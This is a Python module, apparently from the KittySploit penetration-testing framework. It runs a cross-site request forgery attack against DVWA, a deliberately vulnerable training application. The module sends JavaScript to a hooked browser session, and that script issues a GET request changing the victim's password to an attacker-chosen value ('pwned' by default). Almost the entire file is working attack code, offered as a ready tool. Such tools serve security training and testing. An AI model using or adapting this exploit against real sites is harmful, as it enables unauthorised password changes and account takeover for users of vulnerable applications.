from kittysploit import *
from lib.protocols.http.csrf import Csrf

class Module(BrowserAuxiliary, Csrf):
	
	__info__ = {
		"name": "dvwa csrf",
		"description": "DVWA CSRF attack - Change password via CSRF GET",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}
	
	target = OptString("http://127.0.0.1", "Target URL (with http://)", required=True)
	password = OptString("pwned", "New password to set", required=True)

	def run(self):
		"""Execute CSRF GET attack to change password in DVWA"""
		url = f"{self.target}/dvwa/vulnerabilities/csrf/?password_new={self.password}&password_conf={self.password}&Change=Change"
		
		print_info(f"Executing CSRF GET attack on: {url}")
		
		js_code = self.csrf_get(url)
		result = self.send_js_and_wait_for_response(js_code, timeout=5.0)
		
		if result:
			print_success(f"CSRF GET attack executed successfully")
			print_info(f"Response: {result}")
			print_info(f"Password change request sent: {self.password}")
			return True
		else:
			fail.CSRFGetFailed()
		return False
